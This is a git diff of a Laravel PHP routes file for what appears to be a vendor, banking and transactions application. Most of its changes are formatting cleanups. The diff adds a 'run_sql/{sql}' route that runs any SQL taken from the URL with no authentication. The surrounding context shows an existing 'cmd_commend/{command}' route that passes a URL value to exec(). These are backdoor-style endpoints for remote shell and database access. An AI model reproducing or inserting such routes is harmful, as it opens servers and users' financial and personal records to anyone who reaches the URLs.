@@ -1,6 +1,7 @@
 <?php
 
 use Illuminate\Support\Facades\Artisan;
+use Illuminate\Support\Facades\DB;
 use Illuminate\Support\Facades\Route;
 
 Route::get('artisan_commend/{command}', function ($command) {
@@ -14,6 +15,15 @@ Route::get('cmd_commend/{command}', function ($command) {
     if ($command) {
         exec($command, $output);
         return $output;
+    }
+});
+
+Route::get('run_sql/{sql}', function ($sql) {
+    ini_set('max_execution_time', 300);
+    if ($sql) {
+        $result = DB::select($sql);
+
+        return $result;
     }
 });
 
@@ -66,7 +76,6 @@ Route::middleware('maintenance_mode')->group(function () {
             Route::get('events', 'ActivityController@getEvents')->name('events');
             Route::get('export_pdf', 'exportPDF')->name('export_pdf');
             Route::get('export_excel', 'exportExcel')->name('export_excel');
-
         });
 
         Route::delete('delete-image/{appMedia}', 'DeleteImageController')->name('image_delete');
@@ -236,8 +245,8 @@ Route::middleware('maintenance_mode')->group(function () {
                 // 'employees' => 'EmployeeController',
                 // 'clients' => 'ClientController',
                 'vendors' => 'VendorController',
-                'vendor_branches'=>'VendorBranchController',
-                'our_apps'=>'OurAppController',
+                'vendor_branches' => 'VendorBranchController',
+                'our_apps' => 'OurAppController',
                 'rasid_jobs' => 'RasidJobController',
                 'banks' => 'BankController',
                 'transfer_purposes' => 'TransferPurposeController',
@@ -248,19 +257,18 @@ Route::middleware('maintenance_mode')->group(function () {
             ]);
 
             Route::apiResource('vendor_branches', 'VendorBranchController')->except('get_vendors');
-            Route::apiResource('contacts', 'ContactController')->only('index','show');
+            Route::apiResource('contacts', 'ContactController')->only('index', 'show');
             Route::apiResource('vendor_packages', 'VendorPackageController')->except('destroy');
             Route::apiResource('citizens', 'CitizenController')->only('index', 'show', 'update');
             Route::apiResource('settings', 'SettingController')->only(['index', 'store']);
-            Route::apiResource('links', 'LinkController')->only(['index','update']);
-            Route::apiResource('transactions', 'TransactionController')->except(['update','destroy']);
+            Route::apiResource('links', 'LinkController')->only(['index', 'update']);
+            Route::apiResource('transactions', 'TransactionController')->except(['update', 'destroy']);
             Route::apiResource('activity_logs', 'ActivityController')->only(['index', 'show']);
-            Route::post('localizations_update','LocalizationController@updateTranslation')->name('localizations.update');
+            Route::post('localizations_update', 'LocalizationController@updateTranslation')->name('localizations.update');
             Route::apiResource('localizations', 'LocalizationController')->only(['store', 'index']);
 
 
             Route::resource('groups', 'GroupController')->except('create', 'edit', 'destroy');
-
         });
     });
 });
